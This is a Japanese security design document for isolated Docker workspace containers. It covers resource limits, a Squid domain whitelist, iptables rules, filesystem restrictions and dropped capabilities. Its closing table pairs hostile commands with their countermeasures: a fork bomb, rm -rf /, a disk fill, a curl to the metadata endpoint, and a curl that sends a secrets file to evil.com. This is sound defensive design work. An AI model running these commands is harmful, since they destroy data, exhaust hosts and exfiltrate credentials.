# 04 - セキュリティ設計

## 多層防御アーキテクチャ

```
Layer 1: Docker コンテナ隔離 (namespace, cgroups)
Layer 2: Linux Security Modules (seccomp, AppArmor)
Layer 3: リソース制限 (CPU, Memory, Disk, PIDs)
Layer 4: ネットワーク隔離 (制限付きネットワーク or --network none)
Layer 5: ファイルシステム制限 (read-only root + targeted writable mounts)
Layer 6: 認証情報隔離 (Docker Secrets / プロキシベース注入)
```

## リソース制限

### コンテナリソース設定

```python
RESOURCE_LIMITS = {
    # CPU: 2 cores
    "cpu_period": 100000,
    "cpu_quota": 200000,

    # メモリ: 4GB (swap 無効)
    "mem_limit": "4g",
    "memswap_limit": "4g",

    # プロセス数: フォークボム対策
    "pids_limit": 256,

    # ディスク: overlay2 + XFS pquota 環境で有効
    # ext4 環境では loopback XFS ファイルを使用（後述）
    "storage_opt": {"size": "5G"},
}
```

### 各制限の理由

| 制限 | 値 | 脅威 | 効果 |
|------|-----|------|------|
| CPU 2 cores | `cpu_quota=200000` | 無限ループ、暗号マイニング | CPU 独占を防止 |
| Memory 4GB | `mem_limit=4g` | メモリリーク、大量データ処理 | OOM Killer が発動 |
| Swap 無効 | `memswap_limit=4g` | swap 使用によるホスト劣化 | メモリ超過で即停止 |
| PIDs 256 | `pids_limit=256` | フォークボム `:(){ :\|:& };:` | プロセス数を制限 |
| Disk 5GB | `storage_opt size=5G` | 大量ファイル生成、core dump | ディスク消費を制限 |

### ディスククォータの実現方法

| ホスト FS | 方法 | 設定 |
|-----------|------|------|
| **XFS + pquota** | ネイティブ対応 | `--storage-opt size=5G` がそのまま動作 |
| **ext4** | Loopback XFS ファイル | XFS フォーマットのファイルを `/var/lib/docker` にマウント |

```bash
# ext4 環境での loopback XFS セットアップ
dd if=/dev/zero of=/var/lib/docker.xfs bs=1 count=0 seek=200G
mkfs.xfs /var/lib/docker.xfs
mount -o loop,pquota /var/lib/docker.xfs /var/lib/docker
# → これで --storage-opt size=5G が使える
```

## ネットワーク隔離

### Phase 1: 制限付き Docker ネットワーク

```
┌─ Host ──────────────────────────────────────────┐
│                                                   │
│  ┌─ backend-network (bridge) ──────────────────┐ │
│  │  Backend, PostgreSQL, Redis                  │ │
│  └──────────────────────────────────────────────┘ │
│                                                   │
│  ┌─ workspace-network (bridge) ────────────────┐ │
│  │  Workspace Containers                        │ │
│  │  ※ backend-network へのアクセス不可          │ │
│  │  ※ Squid プロキシ経由で外部通信              │ │
│  └──────────────────────────────────────────────┘ │
│                                                   │
│  Backend は両ネットワークに接続                    │
│  Squid Proxy は workspace-network に接続          │
└───────────────────────────────────────────────────┘
```

### Squid プロキシによるドメインホワイトリスト

iptables のみでは FQDN ベースのフィルタリングが困難なため、Squid プロキシを併用する。

```
# squid.conf
acl workspace_whitelist dstdomain "/etc/squid/whitelist.txt"
acl ssl_whitelist ssl::server_name "/etc/squid/whitelist.txt"

# HTTPS (SNI ベース、MITM なし)
acl step1 at_step SslBump1
ssl_bump peek step1
ssl_bump splice ssl_whitelist
ssl_bump terminate all

# HTTP
http_access allow workspace_whitelist
http_access deny all
```

```
# /etc/squid/whitelist.txt
.pypi.org
.files.pythonhosted.org
.registry.npmjs.org
.api.anthropic.com
.bedrock-runtime.*.amazonaws.com
```

```bash
# iptables: workspace コンテナからの直接外部通信をブロック
# Squid プロキシ経由のみ許可
iptables -I DOCKER-USER -s 172.20.0.0/16 -d 169.254.169.254 -j DROP
iptables -I DOCKER-USER -s 172.20.0.0/16 -d 10.0.0.0/8 -j DROP
iptables -I DOCKER-USER -s 172.20.0.0/16 -d 192.168.0.0/16 -j DROP
iptables -I DOCKER-USER -m state --state RELATED,ESTABLISHED -j ACCEPT
```

コンテナ内では環境変数で Squid を指定:
```
HTTP_PROXY=http://squid.workspace-network:3128
HTTPS_PROXY=http://squid.workspace-network:3128
```

### Phase 2 (将来): --network none + Unix Socket

Anthropic 公式推奨の最も安全な構成。コンテナにネットワークスタックを持たせず、Unix Socket のみで通信。

## ファイルシステム保護

### Read-Only Root + Writable マウント

```python
FILESYSTEM_CONFIG = {
    "read_only": True,
    "tmpfs": {
        # /tmp は exec 必要（pip install がビルドスクリプトを実行するため）
        "/tmp": "size=1G,exec",
        "/var/tmp": "size=512M",
        "/run": "size=64M",
        # pip キャッシュ（noexec で OK）
        "/home/appuser/.cache": "size=512M,noexec",
    },
    # volumes: /workspace と /opt/venv は Docker Volume としてマウント
}
```

### ディレクトリ権限

| パス | 権限 | マウント方式 | 説明 |
|------|------|------------|------|
| `/` (root) | read-only | イメージレイヤー | システムファイル保護 |
| `/workspace` | read-write | エフェメラルボリューム | ユーザーファイル領域 |
| `/opt/venv` | read-write | エフェメラルボリューム | pip install 先 |
| `/tmp` | read-write, **exec** | tmpfs (1GB) | ビルド一時ファイル |
| `/home/appuser/.cache` | read-write, noexec | tmpfs (512MB) | pip キャッシュ |
| `/home/appuser` | read-write | tmpfs (64MB) | ホームディレクトリ |

> **注意**: `/tmp` に `noexec` を付けると `pip install` でソースビルドが必要なパッケージ（C拡張等）のインストールが失敗する。

## コンテナセキュリティオプション

```python
SECURITY_CONFIG = {
    # Capability をすべてドロップし、必要なものだけ追加
    "cap_drop": ["ALL"],
    "cap_add": ["CHOWN", "SETUID", "SETGID", "DAC_OVERRIDE"],

    # 新しい特権の取得を禁止
    "security_opt": [
        "no-new-privileges:true",
    ],

    # 特権モードは絶対に使わない
    "privileged": False,
}
```

## 破壊的コマンドへの対策まとめ

| 攻撃 | 対策 |
|------|------|
| `rm -rf /` | read-only root filesystem |
| `:(){ :\|:& };:` (fork bomb) | `pids_limit=256` |
| `dd if=/dev/zero of=/fill bs=1M` | disk quota 5GB |
| `python -c "a='x'*10**10"` | `mem_limit=4g` → OOM Killer |
| `while true; do :; done` | `cpu_quota=200000` (2 cores) |
| `curl http://169.254.169.254/` | iptables でメタデータブロック |
| `psql -h db-host` | ネットワーク隔離（backend-network 非接続） |
| `pip install malicious-pkg` | Squid プロキシで PyPI のみ許可 |
| `env` で認証情報取得 | Docker Secrets (ファイルベース、環境変数に非公開) |
| `curl https://evil.com -d @/run/secrets/key` | Squid ドメインホワイトリスト |
